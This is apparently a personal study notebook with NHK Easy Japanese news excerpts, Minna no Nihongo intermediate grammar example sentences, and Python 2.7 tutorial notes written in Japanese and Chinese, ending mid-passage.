[ニュース_24](http://www3.nhk.or.jp/news/easy/k10010882351000/k10010882351000.html)\n<blockquote>\n<p>\n東京都立川市の７つの小学校に通う子どもや先生などが、１７日の夕方からおなかが痛くなったり吐いたりしました。\n</p>\n<p>\n立川市によると、具合が悪くなったのは、８７４人の子どもと６９人の先生などです。入院した子どももいますが、重症ではありません。\n</p>\n<p>\n７つの小学校は、同じ給食センターで作った給食を食べています。保健所は、給食が原因かもしれないと考えて調べています。\n</p>\n</blockquote>\n#### [ニュース_25](http://www3.nhk.or.jp/news/easy/k10010885381000/k10010885381000.html)\n<blockquote>\n<p>\n鳥取県にある青谷横木遺跡という遺跡では、１０００年以上前にあった「山陰道」という道の跡が見つかっています。\n</p>\n<p>\n鳥取県埋蔵文化財センターがこの遺跡を調べると、１８個の柳の木の根が見つかりました。木の根は５０ｃｍ～２ｍの間をあけてまっすぐ並んでいました。\n</p>\n<p>\n鳥取県埋蔵文化財センターは、１０世紀の終わりごろの平安時代に「山陰道」に植えた木の根だろうと言っています。こんなに古い時代に道に木を並べて植えた跡が見つかったのは日本では初めてだと言っています。\n</p>\n</blockquote>\n#### [ニュース_26](http://www3.nhk.or.jp/news/easy/k10010885231000/k10010885231000.html)\n<blockquote>\n<p>\n国は、日本の陸や周りの海にある活断層などのうち９７を「主要活断層帯」に決めて、地震が起こる可能性などを調べています。「主要活断層帯」は断層の長さや活動の多さなどで決めています。\n</p>\n<p>\n２１日の会議で、地下にも断層が続いていたり、活動が多くなっていたりしていると考えられるほかの活断層などについて、話し合いました。\n</p>\n<p>\nそして、中国地方の８つ、九州地方の６つ、関東地方などの２つの全部で１６の活断層などを新しく「主要活断層帯」にすることを決めました。日本の「主要活断層帯」は全部で１１３になりました。\n</p>\n</blockquote>\n#### [ニュース_27](http://www3.nhk.or.jp/news/easy/k10010883581000/k10010883581000.html)\n<blockquote>\n<p>\n携帯電話の会社のＫＤＤＩは、ビルの中のトイレが空いているかどうかスマートフォンなどでわかるサービスを３月から始めます。\n</p>\n<p>\nトイレのドアにはセンサーを付けます。センサーはインターネットとつながっていて、人が入っていないトイレをスマートフォンやパソコンで知ることができます。トイレに入っている時間が長くなると、メールでビルの会社に知らせます。\n</p>\n<p>\nＫＤＤＩは、いろいろな会社のビルやデパートなどでこのサービスを利用してほしいと考えています。\n</p>\n</blockquote>\n#### [ニュース_28](http://www3.nhk.or.jp/news/easy/k10010883221000/k10010883221000.html)\n<blockquote>\n<p>\n昔、忍者が住んでいた滋賀県甲賀市と三重県伊賀市は、２月２２日を「忍者の日」にして、イベントを行っています。甲賀市の役所では２０日から２４日まで、職員が忍者の服を着て仕事をしています。\n</p>\n<p>\n約２０人の職員たちは黒や赤の忍者の服を着て、電話をしたり、パソコンを使ったりしていました。職員は「忍者なので、いつもよりも早く仕事ができそうです」と話していました。\n</p>\n<p>\n甲賀市では２２日に忍者について勉強する会などを行います。甲賀市の職員は「ぜひ遊びに来てほしいです」と話していました。\n</p>\n</blockquote>\n#### [ニュース_29](http://www3.nhk.or.jp/news/easy/k10010889941000/k10010889941000.html)\n<blockquote>\n<p>\n中国の北京で２５日と２６日、日本の九州、北陸、東北の食べ物や工芸品などを紹介するイベントがありました。このイベントは、日本の政府が、外国人に人気がある東京や京都だけではなくて、いろいろな町のよさを知ってほしいと考えて行いました。\n</p>\n<p>\n会場には、職人が陶器を作って見せている所や、日本酒を飲むことができる所があって、たくさんの人が集まっていました。\n</p>\n<p>\n日本酒を飲んでみた若い男性は「飲みやすくておいしいです」と話していました。若い女性は「九州で寺に行ったり、食べ物を楽しんだりしたいです」と話していました。\n</p>\n</blockquote>\n#### [ニュース_30](http://www3.nhk.or.jp/news/easy/k10010890231000/k10010890231000.html)\n<blockquote>\n<p>\n働く人が足りないため、店員がいなくても、レジで客が自分で計算してお金を払うシステムを使う店が増えています。\n</p>\n<p>\nＤＶＤなどを貸す店の「ゲオ」では、２年前からこのシステムを使っています。客は、ＤＶＤや本などに付いているバーコードを機械に読ませて、お金を払います。このシステムを使っている店は、客がレジで待つ時間が短くなって、売り上げが増えていると言っています。３月には、７４５の店でこのシステムを使う予定です。\n</p>\n<p>\nレストランの「ガスト」などでは１月に、東京にある３つの店でこのシステムを使ってみました。その結果、客が多い時間でも、レジにあまり人が並ばなくなりました。店員は、レジ以外の仕事にもっと時間を使うことができるようになりました。\n</p>\n</blockquote>\n#### [ニュース_31](http://www3.nhk.or.jp/news/easy/k10010912421000/k10010912421000.html)\n<blockquote>\n<p>\n２０２０年にオリンピックとパラリンピックがあるため、東京の近くには新しいホテルがたくさんできています。千葉県浦安市に、ロボットが人の代わりに働くホテルができました。\n</p>\n<p>\nホテルのフロントでは、恐竜の形をしたロボットが日本語や英語、中国語、韓国語で客と話します。客が泊まる部屋にもロボットが置いてあります。このロボットに話すと、テレビやエアコンをつけたり消したりすることができます。\n</p>\n<p>\nこのホテルを経営している会社は、長崎県にあるテーマパークのハウステンボスでも、ロボットを使ったホテルを経営しています。ホテルの社長は「日本に来た外国人に、ロボットがいるホテルを楽しんでほしいです」と話していました。\n</p>\n</blockquote>\n#### [ニュース_32](http://www3.nhk.or.jp/news/easy/k10010911661000/k10010911661000.html)\n<blockquote>\n<p>\nタイのバンコクの空港に１０日、アフリカのエチオピアから来た飛行機の荷物を、タイ人の２人の女が取りに来ました。２人は別の飛行機で来たため、空港の職員がおかしいと思って荷物の中をチェックすると、サイの角が２１本見つかりました。\n</p>\n<p>\n世界ではサイの数が少なくなって、将来いなくなる可能性が高いため、輸出や輸入は禁止されています。しかし、ベトナムや中国ではサイの角が薬になるため、高い値段で売ったり買ったりしています。タイの空港で見つかったサイの角を売ると５億円ぐらいになります。\n</p>\n<p>\n警察は、荷物を取りに来て逃げた２人の女をさがしています。\n</p>\n</blockquote>\n#### [ニュース_33](http://www3.nhk.or.jp/news/easy/k10010911101000/k10010911101000.html)\n<blockquote>\n<p>\n国立情報学研究所のグループは、外国人が日本へ旅行に来て、どこからどこへ行ったかすぐにわかるシステムを作りました。\n</p>\n<p>\n旅行に来た外国人が無料で利用できる無線のＬＡＮのデータを使うと、外国人がいた場所が地図に出ます。そして、外国人がどこからどこへ行ったかわかります。\n</p>\n<p>\nこのシステムを使って、先月東京であったマラソンの大会のコースの近くにいた外国人２３５人について調べました。その結果、ゴールがあった東京駅の近くなどから、夜は新宿や上野へ行ったことがわかりました。\n</p>\n</blockquote>\n#### [ニュース_34](http://www3.nhk.or.jp/news/easy/k10010909711000/k10010909711000.html)\n<blockquote>\n<p>\n政府は新しい法律を作って、残業の規則を厳しくしようと考えています。\n</p>\n<p>\n会社を経営している人たちの団体の経団連と、働く人たちの団体の連合は、残業の規則を何時間までにするか話し合あっていました。２つの団体は、忙しいときでも１年の残業を７２０時間までにする案などに賛成していました。しかし、忙しいときの１か月の残業を何時間までにするかについては違う意見でした。\n</p>\n<p>\n安倍総理大臣は１３日、経団連の榊原会長と、連合の神津会長と会いました。そして、忙しいときでも１か月の残業は１００時間より少なくしたいと言いました。経団連と連合は、安倍総理大臣の言うとおりにしようと考えています。\n</p>\n</blockquote>\n#### [ニュース_35](http://www3.nhk.or.jp/news/easy/k10010902081000/k10010902081000.html)\n<blockquote>\n<p>\nタイのバンコクの空港にアフリカのエチオピアから着いた荷物から、３日と４日、全部で３３０ｋｇの象牙が見つかりました。アフリカゾウという象５０頭以上の象牙が、１５個の荷物の中に入っていて、たくさんの石の中に隠してありました。\n</p>\n<p>\nタイの警察は、荷物を取りに来た男を逮捕して、この男と関係があるグループについて調べることにしています。\n</p>\n<p>\n象牙の輸出や輸入は禁止されています。しかし、中国のお金持ちの中には、部屋などに飾るため象牙で作った物を買う人が多いと言われています。タイの警察は、見つかった象牙は、隠れて中国などに輸出しようとした物だと考えています。\n</p>\n</blockquote>\n#### [ニュース_36](http://www3.nhk.or.jp/news/easy/k10010918801000/k10010918801000.html)\n<blockquote>\n<p>\n気象庁は、東京の靖国神社にあるソメイヨシノという桜の木を調べて、花が咲くと発表しています。\n</p>\n<p>\n２１日、桜の花が５つ咲いていることがわかって、「東京で桜の花が咲きました」と発表しました。今年は日本でいちばん早く東京で桜の花が咲きました。\n</p>\n<p>\n気象庁によると、東京の桜は１週間から１０日ぐらいで満開になりそうです。\n</p>\n</blockquote>\n#### [ニュース_37](http://www3.nhk.or.jp/news/easy/k10010914911000/k10010914911000.html)\n<blockquote>\n<p>\n日本の政府は１７日、鹿児島県の種子島宇宙センターから人工衛星を打ち上げました。\n</p>\n<p>\nこの人工衛星は、地球の周りを飛びながら、陸や海のいろいろな場所を撮影して情報を集めます。夜や天気が悪いときでも電波を使って撮影することができます。\n</p>\n<p>\n人工衛星の情報は、北朝鮮がミサイルを発射する場所や、日本の周りの海、災害の様子などを調べるために使います。\n</p>\n<p>\n情報を集める日本の人工衛星は７つ目です。地球の全部を１日に１回以上、撮影できるようになりました。\n</p>\n</blockquote>\n#### [ニュース_38](http://www3.nhk.or.jp/news/easy/k10010919331000/k10010919331000.html)\n<blockquote>\n<p>\n厚生労働省は毎年、お年寄を殴ったりいじめたりする「虐待」がどのくらいあったか調べています。\n</p>\n<p>\n２０１５年度は、お年寄を介護する施設の職員からの虐待が４０８件ありました。前の年度より１０８件増えて、今までで最も多くなりました。職員の知識や技術が足りないことや、ストレスが多いことなどが原因です。\n</p>\n<p>\n一緒に住んでいる家族などからの虐待は１万５９７６件ありました。体を殴ったりすることが最も多くて、ひどいことを言って心に傷をつけたり、必要な世話をしなかったりすることもありました。息子からの虐待が最も多くて、次は夫と娘からでした。\n</p>\n</blockquote>\n#### [ニュース_39](http://www3.nhk.or.jp/news/easy/k10010929061000/k10010929061000.html)\n<blockquote>\n<p>\n熊本県立図書館は、去年４月の大きな地震で建物が壊れました。１階は去年６月に利用できるようになりましたが、２階と３階は天井などを直していて利用できませんでした。\n</p>\n<p>\n２９日、１階から３階まで全部利用できるようになった図書館が開きました。１階には子どものための本、２階には普通の本、３階には熊本県などについて書いた本が地震の前と同じように並んでいます。\n</p>\n<p>\n来た女性は「ここで本を読むのを楽しみにしていました」と話していました。図書館の人は「長い間お待たせしました。前と同じように利用してほしいと思います」と話しています。\n</p>\n</blockquote>\n#### [ニュース_40](http://www3.nhk.or.jp/news/easy/k10010921801000/k10010921801000.html)\n<blockquote>\n<p>\n名古屋市には有名な城の名古屋城があります。城でいちばん立派な建物の天守閣は１６１２年にできました。天守閣は戦争で焼けてしまったため、１９５９年に鉄筋コンクリートでもう１度建てました。しかし、最近、この建物が古くなってきました。\n</p>\n<p>\n名古屋市は、天守閣をもう１度建てることについて議会で相談していました。そして、昔のように木で建てることを決めました。工事には５００億円以上かかります。\n</p>\n<p>\n名古屋市は、２０１９年の秋ごろに今の天守閣を壊わして、２０２２年に新しい天守閣ができるようにしたいと考えています。\n</p>\n</blockquote>\n###みんなの日本語中級１文型\n####第一課\n* ソースの見方を教えて頂けませんか。\n* 猫のように可愛い彼女を探したいです。\n* 私の趣味は漢方薬の本を読むことです。\n* 正月に神社やお寺に行くことを初詣でと言う\n* Fabricというツールを知っている\n* どんなに高くても一戸建てを買いたいです。\n####第二課\n* 鞄を開けたら、パスポートがなくなっていた。\n* Tudouというのは中国で有名なサイトのことです。\n* 母に財布を忘れないように注意します\n* ジュースみたいなお酒しか飲みません\n####第三課\n* 月曜日は休ませていただきますか？\n* 来年帰国するにします。\n* 生物を食べないことにしています\n* このチケットを担当することになりました。\n* 明日の18時から忘年会を行うことになっています。\n* 早く春が来てほしい。\n* あのアニメはあまり面白くなさそうです。\n####第四課\n* 山田さんから電話があったのですが、約束の時間に少し遅れるということです。\n* グループ長は山田さんにアメリカへ出張させました。\n* 昨日母に部屋を掃除させられました。\n* 新卒の山田さんをご紹介します\n* 妹は友達の本を欲しがっている\n####第五課\n* 改札口を出て、階段を上ったところで、待っていてください。\n* 家を出ようとしたとき、電話がかかってきた\n* 鈴木さんはいい社長になるだろうと思います。\n####第六課\n* 値段が高いので、iPhoneを買うつもりはありません\n* タイへ旅行に行くつもりでしたが、両親に会いたいので、帰国することにします。\n* 一生懸命にやっているつもりです。\n* 星が見えてきた。\n* この猫は一日中、寝てばかりいる。\n####第七課\n* 週報は日本語でなくてはなりません\n* 中山さんが書いたコードは素晴らしく、感心させられました。\n* 毎日自分でご飯を作って、母をびっくりさせました。\n* 頭が痛いなら、この薬を飲むといいですよ\n####第八課\n* 電車に乗っている間、3DSをしていた。\n* このチケットは金曜日までにできたほうがいいと思います。\n* 好きな食べ物は人によって違います\n* 眼鏡をかけたまま、お風呂に入りました。\n####第九課\n* ここに座ってもかまいませんか\n* 神戸は尼崎より有名ですが、大阪ほど有名ではない。\n* 彼女ほど可愛い人はいません。\n* お金があれば、この一戸建てが買えたのに...\n####第十課\n* そのゲームなら、面白いはずです。\n* 人気がある映画なのだから、面白くないはずはありません。\n* 忘年会に行くはずだった。しかし、病気で行けなくなった。\n* 母の料理がいつも美味しいですが、時々美味しくないこともあります。\n####第十一課\n* これから、日本で働く外国人が増えていくでしょう\n* 新聞によると、東京で大きい雪が降ったらしい。\n* 東京は、日本の首都として世界中に知られている。\n####第十二課\n* 週末は本を読んだり、テレビを見たりしています。\n* 私は昨日雨にふられて、濡れてしまった。\n* 値段が安かったおかげで、たくさん林檎を買えました。\n* 事故のせいで、授業に遅れてしまいました。\n##Python\n###資料\n[Python Tutorial (英語)](https://docs.python.org/2.7/tutorial/index.html)\n<p><a href=\"http://www.pythondoc.com/pythontutorial27/index.html\">Python Tutorial (中国語)</a></p>\n<p><a href=\"http://docs.python.jp/3/tutorial/index.html\">Python Tutorial (日本語)</a></p>\n<h3 id=\"\">学んだこと</h3>\n<h4 id=\"\">基礎知識</h4>\n<h5 id=\"python\">Python インタプリタ</h5>\n<ul>\n<li>Python インタプリタは、それが使えるマシン上では通常 <code>/usr/local/bin/python</code> としてインストールされています。その他の場所としては <code>/usr/local/python</code> が一般的です。</li>\n</ul>\n<h5 id=\"python\">Python の紹介</h5>\n<ul>\n<li>割り算 (<code>/</code>), <code>//</code> 演算子,<code>**</code> 演算子</li>\n</ul>\n<pre><code class=\"python\">>>> 17 / 3  # int / int -> int\n5\n>>> 17 / 3.0  # int / float -> float\n5.666666666666667\n>>> 17 // 3.0  # explicit floor division discards the fractional part\n5.0\n>>> 17 % 3  # the % operator returns the remainder of the division\n2\n>>> 5 ** 2  # 5 squared\n25\n>>> 2 ** 7  # 2 to the power of 7\n128\n</code></pre>\n<ul>\n<li>対話モードでは、最後に表示された結果は変数 <code>_</code> に代入されます。このことを利用すると、Python を電卓として使うときに、計算を連続して行う作業が多少楽になります</li>\n</ul>\n<pre><code class=\"python\">>>> tax = 12.5 / 100\n>>> price = 100.50\n>>> price * tax\n12.5625\n>>> price + _\n113.0625\n>>> round(_, 2)\n113.06\n</code></pre>\n<ul>\n<li>文字列は <code>+</code> 演算子で連結させる (くっつけて一つにする) ことができ、<code>*</code> 演算子で反復させることができます</li>\n</ul>\n<pre><code class=\"python\">>>> # 3 times 'un', followed by 'ium'\n>>> 3 * 'un' + 'ium'\n'unununium'\n</code></pre>\n<ul>\n<li>末尾にコンマを入れると、出力を行った後に改行されません。</li>\n</ul>\n<h5 id=\"\">その他の制御フローツール</h5>\n<ul>\n<li>ループ文は <code>else</code> 節を持つことができます。これは、 (<code>for</code> で) 反復処理対象のリストを使い切ってループが終了したとき、または (<code>while</code> で) 条件が偽になったときに実行されますが、 <code>break</code> 文でループが終了したときは実行されません</li>\n</ul>\n<pre><code class=\"python\">>>> for n in range(2, 10):\n...     for x in range(2, n):\n...         if n % x == 0:\n...             print n, 'equals', x, '*', n/x\n...             break\n...     else:\n...         # loop fell through without finding a factor\n...         print n, 'is a prime number'\n...\n2 is a prime number\n3 is a prime number\n4 equals 2 * 2\n5 is a prime number\n6 equals 2 * 3\n7 is a prime number\n8 equals 2 * 4\n9 equals 3 * 3\n</code></pre>\n<ul>\n<li>デフォルト値は、関数が定義された時点で、関数を 定義している 側のスコープ (scope) で評価されるので, <code>5</code> を出力します。</li>\n</ul>\n<pre><code class=\"python\">i = 5\n\ndef f(arg=i):\n    print arg\n\ni = 6\nf()\n</code></pre>\n<h5 id=\"\">データ構造</h5>\n<ul>\n<li>引数リストのアンパック</li>\n</ul>\n<pre><code class=\"python\">>>> list(range(3, 6))            # normal call with separate arguments\n[3, 4, 5]\n>>> args = [3, 6]\n>>> list(range(*args))            # call with arguments unpacked from a list\n[3, 4, 5]\n\n>>> def parrot(voltage, state='a stiff', action='voom'):\n...     print \"-- This parrot wouldn't\", action,\n...     print \"if you put\", voltage, \"volts through it.\",\n...     print \"E's\", state, \"!\"\n...\n>>> d = {\"voltage\": \"four million\", \"state\": \"bleedin' demised\", \"action\": \"VOOM\"}\n>>> parrot(**d)\n-- This parrot wouldn't VOOM if you put four million volts through it. E's bleedin' demised !\n</code></pre>\n<ul>\n<li><code>filter(function, sequence)</code> は、シーケンス <code>sequence</code>中の要素 <code>item</code> から、 <code>function(item)</code> が真となるような要素からなるシーケンスを返します。もし <code>sequence</code> が <code>str</code> か <code>unicode</code> か <code>tuple</code> なら、返り値も同じ型になります。そうでなければ <code>list</code> になります。</li>\n</ul>\n<pre><code class=\"python\">>>> seq = [3,2,5,6,8,9,10]\n>>> filter(lambda x : x < 6, seq)\n[3, 2, 5]\n</code></pre>\n<ul>\n<li><code>map(function, sequence)</code> は、シーケンス <code>sequence</code> の各要素 <code>item</code> に対して <code>function(item)</code> を呼び出し、その戻り値からなるリストを返します。複数のシーケンスを渡すこともできます。その場合、第一引数の関数はシーケンスの数と等しい数の引数を受け取る必要があり、各シーケンスの値が渡されます。 (幾つかのシーケンスが他のシーケンスよりも短かった場合は、その場所には <code>None</code> が渡されます。)</li>\n</ul>\n<pre><code class=\"python\">>>> seqA = [3,5,6,9]\n>>> seqB = [4,6,8]\n>>> map(lambda x,y:x+y, seqA, seqA)\n[6, 10, 12, 18]\n>>> map(None, seqA, seqA)\n[(3, 3), (5, 5), (6, 6), (9, 9)]\n>>> map(None, seqA, seqB)\n[(3, 4), (5, 6), (6, 8), (9, None)]\n>>> map(lambda x,y:x+y, seqA, seqB)\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\n  File \"<stdin>\", line 1, in <lambda>\nTypeError: unsupported operand type(s) for +: 'int' and 'NoneType'\n</code></pre>\n<ul>\n<li><code>reduce(function, sequence)</code> は単一の値を返します。この値は 2 つの引数をとる関数 <code>function</code> をシーケンス <code>sequence</code> の最初の二つの要素を引数として呼び出し、次にその結果とシーケンスの次の要素を引数にとり、以降これを繰り返していきます。シーケンス中にただ一つしか要素がなければ、その値自体が返されます。シーケンスが空なら、例外が送出されます。3 つめの引数をわたして、初期値を指定することもできます。この場合、空のシーケンスを渡すと初期値が返されます。それ以外の場合には、まず初期値とシーケンス中の最初の要素に対して関数が適用され、次いでその結果とシーケンスの次の要素に対して適用され、以降これが繰り返されます。</li>\n</ul>\n<pre><code class=\"python\">>>> reduce(lambda x,y:x+y, range(10))\n45\n>>> reduce(lambda x,y:x+y, range(10),10)\n55\n>>> reduce(lambda x,y:x+y, [],10)\n10\n>>> reduce(lambda x,y:x+y, [])\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nTypeError: reduce() of empty sequence with no initial value\n>>> reduce(lambda x,y:x+y, [3])\n3\n</code></pre>\n<ul>\n<li>リストから要素を削除する際、値を指定する代わりにインデックスを指定する方法があります。それが <code>del</code> 文です。これは <code>pop()</code> メソッドと違い、値を返しません。 <code>del</code> 文はリストからスライスを除去したり、リスト全体を削除することもできます(以前はスライスに空のリストを代入して行っていました)。例えば以下のようにします:</li>\n</ul>\n<pre><code class=\"python\">>>> a = [-1, 1, 66.25, 333, 333, 1234.5]\n>>> del a[0]\n>>> a\n[1, 66.25, 333, 333, 1234.5]\n>>> del a[2:4]\n>>> a\n[1, 66.25, 1234.5]\n>>> del a[:]\n>>> a\n[]\n>>> del a\n</code></pre>\n<ul>\n<li>シーケンスにわたるループを行う際、 <code>enumerate()</code> 関数を使うと、要素のインデックスと要素を同時に取り出すことができます。</li>\n</ul>\n<pre><code class=\"python\">>>> for i, v in enumerate(['tic', 'tac', 'toe']):\n...     print i, v\n...\n0 tic\n1 tac\n2 toe\n</code></pre>\n<ul>\n<li>二つまたはそれ以上のシーケンス型を同時にループするために、関数 <code>zip()</code> を使って各要素をひと組みにすることができます。</li>\n</ul>\n<pre><code class=\"python\">>>> questions = ['name', 'quest', 'favorite color']\n>>> answers = ['lancelot', 'the holy grail', 'blue']\n>>> for q, a in zip(questions, answers):\n...     print 'What is your {0}?  It is {1}.'.format(q, a)\n...\nWhat is your name?  It is lancelot.\nWhat is your quest?  It is the holy grail.\nWhat is your favorite color?  It is blue.\n</code></pre>\n<ul>\n<li>シーケンスを逆方向に渡ってループするには、まずシーケンスの範囲を順方向に指定し、次いで関数 <code>reversed()</code> を呼び出します。</li>\n</ul>\n<pre><code class=\"python\">>>> for i in reversed(xrange(1,10,2)):\n...     print i\n...\n9\n7\n5\n3\n1\n</code></pre>\n<ul>\n<li>シーケンスをソートされた順序でループするには、 <code>sorted()</code> 関数を使います。この関数は元の配列を変更せず、ソート済みの新たな配列を返します。</li>\n</ul>\n<pre><code class=\"python\">>>> basket = ['apple', 'orange', 'apple', 'pear', 'orange', 'banana']\n>>> for f in sorted(set(basket)):\n...     print f\n...\napple\nbanana\norange\npear\n</code></pre>\n<ul>\n<li>ときどきループ内でリストを変更したい誘惑に駆られるでしょうが、代わりに新しいリストを作ってしまうほうがより簡単で安全なことが、ままあります</li>\n</ul>\n<pre><code class=\"python\">>>> words = ['cat', 'window', 'defenestrate']\n>>> for w in words[:]:  # Loop over a slice copy of the entire list.\n...     if len(w) > 6:\n...         words.insert(0, w)\n...\n>>> words\n['defenestrate', 'cat', 'window', 'defenestrate']\n</code></pre>\n<h5 id=\"\">入力と出力</h5>\n<ul>\n<li>2 乗と 3 乗の値からなる表を書く二つの方法を示します</li>\n</ul>\n<pre><code class=\"python\">>>> for x in range(1, 11):\n...     print repr(x).rjust(2), repr(x*x).rjust(3),\n...     # Note trailing comma on previous line\n...     print repr(x*x*x).rjust(4)\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n\n>>> for x in range(1,11):\n...     print '{0:2d} {1:3d} {2:4d}'.format(x, x*x, x*x*x)\n...\n 1   1    1\n 2   4    8\n 3   9   27\n 4  16   64\n 5  25  125\n 6  36  216\n 7  49  343\n 8  64  512\n 9  81  729\n10 100 1000\n</code></pre>\n<ul>\n<li>もう一つのメソッド、<code>str.zfill()</code> は、数値文字列の左側をゼロ詰めします。このメソッドは正と負の符号を正しく扱います</li>\n</ul>\n<pre><code class=\"python\">>>> '12'.zfill(5)\n'00012'\n>>> '-3.14'.zfill(7)\n'-003.14'\n>>> '3.14159265359'.zfill(5)\n'3.14159265359'\n</code></pre>\n<ul>\n<li>str.format()</li>\n</ul>\n<pre><code class=\"python\">>>> print 'We are the {} who say \"{}!\"'.format('knights', 'Ni')\nWe are the knights who say \"Ni!\"\n>>> print '{0} and {1}'.format('spam', 'eggs')\nspam and eggs\n>>> print '{1} and {0}'.format('spam', 'eggs')\neggs and spam\n>>> print 'This {food} is {adjective}.'.format(\n...       food='spam', adjective='absolutely horrible')\nThis spam is absolutely horrible.\n>>> print 'The story of {0}, {1}, and {other}.'.format('Bill', 'Manfred',\n...                                                    other='Georg')\nThe story of Bill, Manfred, and Georg.\n</code></pre>\n<h5 id=\"\">エラーと例外</h5>\n<ul>\n<li>一つの <code>try</code> 文に複数の <code>except</code> 節を設けて、さまざまな例外に対するハンドラを指定することができます。同時に一つ以上のハンドラが実行されることはありません。ハンドラは対応する <code>try</code> 節内で発生した例外だけを処理し、同じ <code>try</code> 文内の別の例外ハンドラで起きた例外は処理しません。 <code>except</code> 節には複数の例外を丸括弧で囲ったタプルにして渡すことができます。このタプルの周囲の括弧は必要です。</li>\n</ul>\n<pre><code class=\"python\">... except (RuntimeError, TypeError, NameError):\n...     pass\n</code></pre>\n<ul>\n<li><code>try ... except</code> 文には、オプションで <code>else</code> 節 (else clause) を設けることができます。 <code>else</code> 節を設ける場合、全ての <code>except</code> 節よりも後ろに置かなければなりません。 <code>else</code> 節は <code>try</code> 節で全く例外が送出されなかったときに実行されるコードを書くのに役立ちます。</li>\n</ul>\n<pre><code class=\"python\">for arg in sys.argv[1:]:\n    try:\n        f = open(arg, 'r')\n    except IOError:\n        print 'cannot open', arg\n    else:\n        print arg, 'has', len(f.readlines()), 'lines'\n        f.close()\n</code></pre>\n<ul>\n<li>定義済みクリーンアップ処理</li>\n</ul>\n<pre><code class=\"python\">with open(\"myfile.txt\") as f:\n    for line in f:\n        print line,\n</code></pre>\n<h4 id=\"library\">Library</h4>\n<h5 id=\"list\">list</h5>\n<p>L = range(1,5)      #即 L=[1,2,3,4],不含最后一个元素<br>\nL = range(1, 10, 2) #即 L=[1, 3, 5, 7, 9]</p>\n<p>list的方法<br>\nL.append(var)   #追加元素<br>\nL.insert(index,var)<br>\nL.pop(var)      #返回最后一个元素，并从list中删除之<br>\nL.remove(var)   #删除第一次出现的该元素<br>\nL.count(var)    #该元素在列表中出现的个数<br>\nL.index(var)    #该元素的位置,无则抛异常<br>\nL.extend(list)  #追加list，即合并list到L上<br>\nL.sort()        #排序<br>\nL.reverse()     #倒序<br>\nlist 操作符:,+,*，关键字del<br>\na[1:]       #片段操作符，用于子list的提取<br>\n[1,2]+[3,4] #为[1,2,3,4]。同extend()<br>\n[2]*4       #为[2,2,2,2]<br>\ndel L[1]    #删除指定下标的元素<br>\ndel L[1:3]  #删除指定下标范围的元素</p>\n<h5 id=\"dict\">dict</h5>\n<p>D.get(key, 0)       #同dict[key]，多了个没有则返回缺省值，0。[]没有则抛异常<br>\nD.has_key(key)      #有该键返回TRUE，否则FALSE<br>\nD.keys()            #返回字典键的列表<br>\nD.values()<br>\nD.items()</p>\n<p>D.update(dict2)     #增加合并字典<br>\nD.popitem()         #得到一个pair，并从字典中删除它。已空则抛异常<br>\nD.clear()           #清空字典，同del dict<br>\nD.copy()            #拷贝字典<br>\nD.cmp(dict1,dict2)</p>\n<h5 id=\"tuple\">tuple</h5>\n<p>tuple = ('a', 'b', 'c', 'd', 'e')<br>\n可以用list的 [],:操作符提取元素。就是不能直接修改元素。</p>\n</div>","amp":"27","plaintext":"日本語\n単語\n位置単語数量みんなの日本語第一課43みんなの日本語第二課67みんなの日本語第三課57みんなの日本語第四課60みんなの日本語第五課72みんなの日本語第六課87\nみんなの日本語第七課53みんなの日本語第八課71みんなの日本語第九課73みんなの日本語第十課52ここまで635みんなの日本語第十一課79みんなの日本語第十二課\n51みんなの日本語第十三課60みんなの日本語第十四課40みんなの日本語第十五課43みんなの日本語第十六課45みんなの日本語第十七課66みんなの日本語第十八課44\nみんなの日本語第十九課40みんなの日本語第二十課21ここまで489 / 1124みんなの日本語第二十一課50みんなの日本語第二十二課32みんなの日本語第二十三課\n40みんなの日本語第二十四課25みんなの日本語第二十五課20みんなの日本語第二十六課60みんなの日本語第二十七課70みんなの日本語第二十八課50\nみんなの日本語第二十九課57みんなの日本語第三十課53ここまで457 / 1581みんなの日本語第三十一課76みんなの日本語第三十二課70\nみんなの日本語第三十三課60みんなの日本語第三十四課91みんなの日本語第三十五課55みんなの日本語第三十六課60みんなの日本語第三十七課66\nみんなの日本語第三十八課44みんなの日本語第三十九課55みんなの日本語第四十課70ここまで647 / 2228みんなの日本語第四十一課50\nみんなの日本語第四十二課65みんなの日本語第四十三課45みんなの日本語第四十四課55みんなの日本語第四十五課35みんなの日本語第四十六課80\nみんなの日本語第四十七課48みんなの日本語第四十八課28みんなの日本語第四十九課32みんなの日本語第五十課34ここまで472 / 2700\n###ニュース\n####\n[ニュース_01](http://www3.nhk.or.jp/news/easy/k10010810471000/k10010810471000.html)\n４月１４日、熊本県でマグニチュード６.５（Ｍ６．５）の地震がありました。熊本県の益城町では、震度７のとても強い揺れがありました。震度７以上の地震は、２０１１年３月の東日本大震災のあと初めてでした。\n\n４月１６日には、マグニチュード７．３（Ｍ７．３）のもっと大きな地震がありました。そのあとも熊本県や隣の大分県で地震が続きました。\n\nこの地震で、熊本県では１２月２０日までに１６０人が亡くなりました。この中の１０４人は、避難したあと体の具合が悪くなったりして亡くなりました。\n\n\n地震で壊れた家は１７万軒以上ありました。県は、家が壊れた人などがしばらく住む家を約４３００軒建てました。田んぼや畑にひびが入って農業ができなくなった人などもいました。有名な城の熊本城でも、建物が壊れました。\n\n\n地震の前のように戻るためには、しなければならないことがたくさんあります。\n\n####\n[ニュース_02](http://www3.nhk.or.jp/news/easy/k10010822341000/k10010822341000.html)\nアメリカの映画「スター・ウォーズ」に出た俳優、キャリー・フィッシャーさんが１２月２７日に亡くなりました。６０歳でした。\n\n\nフィッシャーさんは、１９７７年にヒロインのレイア姫になって、とても勇気がある強い女性を演じました。「スター・ウォーズ」は世界中で人気が出て、シリーズになりました。フィッシャーさんは、その２つ目と３つ目の映画にも出ました。それから３２年が過ぎた去年、新しい「スター・ウォーズ」の映画でまたレイア姫になりました。\n\n\n監督のジョージ・ルーカスさんは「フィッシャーさんはとても頭がいい俳優でした。レイア姫を上手に演じました」と話しました。\n\n####\n[ニュース_03](http://www3.nhk.or.jp/news/easy/k10010820221000/k10010820221000.html)\n北海道の海では今、「毛ガニ」を取っています。毛ガニなどのかには、正月の準備をする今の季節に買う人が多くなります。\n\n\n北海道の白糠町では１２月２６日の朝、全部で５００ｋｇの毛ガニが取れました。港では、取ってきたかにを大きさで分けました。甲羅の大きさが１０ｃｍ以上の大きい毛ガニは、競りで１ｋ